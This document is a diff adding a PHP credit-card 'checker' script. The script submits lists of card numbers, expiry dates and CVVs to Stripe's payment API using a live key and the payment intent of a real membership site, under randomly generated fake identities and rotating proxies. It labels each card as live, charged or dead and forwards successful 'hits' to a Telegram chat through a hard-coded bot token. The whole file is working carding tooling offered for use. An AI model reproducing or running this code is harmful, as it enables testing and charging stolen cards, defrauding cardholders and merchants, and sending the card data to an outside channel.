@@ -1,0 +1,402 @@
+
+<?php 
+error_reporting(0);
+//---------------------------------------//
+$mtc_site = "https://deepdive.servicedaccommodationsecrets.com/membership-account/membership-checkout" ;
+$amo = "1$" ;
+//---------------------------------------//
+
+$update = file_get_contents('php://input');
+$update = json_decode($update, TRUE);
+$print = print_r($update);
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    extract($_POST);
+} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
+    extract($_GET);
+}
+;
+
+//==================[Randomizing Details]======================//
+$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
+preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
+$name = $matches1[1][0];
+preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
+$last = $matches1[1][0];
+preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+$email = $matches1[1][0];
+preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
+$street = $matches1[1][0];
+preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
+$city = $matches1[1][0];
+preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
+$state = $matches1[1][0];
+preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
+$phone = $matches1[1][0];
+preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
+$postcode = $matches1[1][0];
+//==================[Randomizing Details-END]======================//
+
+function GetStr($string, $start, $end) {
+    $str = explode($start, $string);
+    $str = explode($end, $str[1]);  
+    return $str[0];
+}
+function inStr($string, $start, $end, $value) {
+    $str = explode($start, $string);
+    $str = explode($end, $str[$value]);
+    return $str[0];
+}
+$separa = explode("|", $lista);
+$cc = $separa[0];
+$mes = $separa[1];
+$ano = $separa[2];
+$cvv = $separa[3];
+
+function rebootproxys()
+{
+  $poxySocks = file("proxy.txt");
+  $myproxy = rand(0, sizeof($poxySocks) - 1);
+  $poxySocks = $poxySocks[$myproxy];
+  return $poxySocks;
+}
+$poxySocks4 = rebootproxys();
+
+$number1 = substr($ccn,0,4);
+$number2 = substr($ccn,4,4);
+$number3 = substr($ccn,8,4);
+$number4 = substr($ccn,12,4);
+$number6 = substr($ccn,0,6);
+
+function value($str,$find_start,$find_end)
+{
+    $start = @strpos($str,$find_start);
+    if ($start === false) 
+    {
+        return "";
+    }
+    $length = strlen($find_start);
+    $end    = strpos(substr($str,$start +$length),$find_end);
+    return trim(substr($str,$start +$length,$end));
+}
+
+function mod($dividendo,$divisor)
+{
+    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
+}
+# -------------------- [1 REQ] -------------------#
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: api.stripe.com',
+'method: POST',
+'path: /v1/payment_methods h2',
+'scheme: https',
+'accept: application/json',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-site',
+'user-agent: Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
+));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+
+# ----------------- [1req Postfields] ---------------------#
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'&billing_details[email]=mdtoufiqul321%40gmail.com&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=7cc2fbcb-c81c-424d-8f5f-686a078af23d279264&muid=a99e1dbf-5600-43b0-8ad4-18b9a7fc3b9fa3f9d4&sid=36e78f83-2bd3-4f72-87c4-31762160c69a0d1643&payment_user_agent=stripe.js%2F025249863%3B+stripe-js-v3%2F025249863&time_on_page=34130&key=pk_live_YRUPfGPeKn5tFcA9iZUXX3vI00Tnvs9jpz&_stripe_account=acct_1KVj2pF8Vft72pRR');
+
+
+
+
+$result1 = curl_exec($ch);
+$id = trim(strip_tags(getStr($result1,'"id": "','"')));
+#$pi = Getstr($result1,'client_secret":"','_secret');
+
+#$src = Getstr($result1,'client_secret":"','"');
+# -------------------- [2 REQ] -------------------#
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3MecqzF8Vft72pRR2wmZbhow/confirm');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: api.stripe.com',
+'method: POST',
+'path: /v1/payment_methods h2',
+'scheme: https',
+'accept: application/json',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
+'sec-fetch-dest: cors',
+'sec-fetch-mode: empty',
+'sec-fetch-site: same-site',
+'user-agent: Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',));
+
+# ----------------- [2req Postfields] ---------------------#
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method='.$id.'&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_YRUPfGPeKn5tFcA9iZUXX3vI00Tnvs9jpz&_stripe_account=acct_1KVj2pF8Vft72pRR&client_secret=pi_3MecqzF8Vft72pRR2wmZbhow_secret_8ltqi5nRvvF5edyVJZ0WgWWBt');
+
+
+
+
+
+
+
+$receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
+
+
+
+$result2 = curl_exec($ch);
+# ---------------------------------------#
+
+
+# ---------------- [Responses] ----------------- #
+if(strpos($result2, "payment_intent_unexpected_state")) {
+
+
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';
+
+    }
+
+elseif(strpos($result2, "succeeded")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:1$ Charged @GOD_MILLION💯✅👑</span><br> <br>';
+    $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ 50$ charged 💥 ✅";
+
+$apiToken = '6218877017:AAHcL_N6JglMmscZ1FEacbVzd8MG_BV0bLw'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '-911559002','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+exit;
+}
+
+elseif(strpos($result2, "Your card has insufficient funds.")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CVV CHARGED:'.$amo.'✅ @GOD_MILLION💯✅👑</span><br>';
+    $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ Charged 1$ ✅";
+
+
+$apiToken = '6218877017:AAHcL_N6JglMmscZ1FEacbVzd8MG_BV0bLw'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '-911559002','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+exit;
+    }
+
+
+
+elseif(strpos($result2, "incorrect_zip")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅ @GOD_MILLION💯✅👑<span><br>';
+    exit;
+    }
+    
+    elseif(strpos($result2, "Your card has insufficient funds.")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:CVV CHARGED '.$amo.'✅  @GOD_MILLION✅💯👑</span><br>';
+    
+    $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ Charged 1$ ✅";
+
+$apiToken = '6218877017:AAHcL_N6JglMmscZ1FEacbVzd8MG_BV0bLw'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '-911559002','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+exit;
+    }
+
+elseif(strpos($result2, 'security code is incorrect.')) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CCN CHARGED: '.$amo.' ✅ @GOD_MILLION💯✅👑</span><br>';
+    
+    $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ✅";
+
+$apiToken = '6218877017:AAHcL_N6JglMmscZ1FEacbVzd8MG_BV0bLw'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '-911559002','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+exit;
+    }
+    elseif(strpos($result2, 'security code is invalid.')) {
+
+        echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CCN CHARGED '.$amo.'✅ @GOD_MILLION💯✅👑</span><br>';
+        
+        $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ✅";
+
+$apiToken = '6218877017:AAHcL_N6JglMmscZ1FEacbVzd8MG_BV0bLw'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '-911559002','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+exit;
+        }
+    elseif(strpos($result2, "Security code is incorrect")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CNN CHARGED ✅ @GOD_MILLION💯✅👑</span><br>';
+    
+      $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ☑️";
+
+$apiToken = '6218877017:AAHcL_N6JglMmscZ1FEacbVzd8MG_BV0bLw'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '-911559002','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+      
+      
+      
+    }
+    
+elseif(strpos($result2, "transaction_not_allowed")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅ @GOD_MILLION💯✅👑</span><br>';
+    exit;
+    }
+    
+
+elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
+
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅ @GOD_MILLION💯✅👑 </span><br>';
+    exit;
+    }
+elseif(strpos($result2, "generic_decline")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result:GENERIC DECLINE ❌</span><br>';
+    }
+
+elseif(strpos($result2, "do_not_honor")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ </span><br>';
+
+}
+
+
+elseif(strpos($result2, "fraudulent")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT❌</span><br>';
+
+}
+elseif(strpos($result2, "intent_confirmation_challenge")) {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result:generic_decline</span><br>';
+
+    }
+
+
+elseif(strpos($result2, 'Your card was declined.')) {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
+}
+
+elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
+}
+
+elseif(strpos($result2, '"cvc_check": "pass"')) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV CHECK PASS ✅  </span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Membership Confirmation")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE✅ @GOD_MILLION💯✅👑</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Thank you for your support!")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅ @GOD_MILLION💯✅👑</span><br>';
+exit;
+}
+
+
+
+
+elseif(strpos($result2, "/wishlist-member/?reg=")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV ✅ @GOD_MILLION💯✅👑</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "id.")) {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span><br>Result: Declined @GOD_MILLION💯✅👑</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Thank You")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE✅ @GOD_MILLION💯✅👑</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "incorrect_cvc")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:incorrect_cvc✅  @TPH__FASAKYT💯✅👑</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:Card is declined by your bank ✅  @GOD_MILLION💯✅👑</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Your card does not support this type of purchase.")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:Your card does not support ✅@GOD_MILLION💯✅👑 </span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Your card is not supported.")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED @GOD_MILLION💯✅👑</span><br>';
+exit;
+}
+
+
+else {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINE@GOD_MILLION💯✅👑</span><br>';
+
+}
+
+
+
+curl_close($ch);
+ob_flush();
+#echo $result1;
+?>
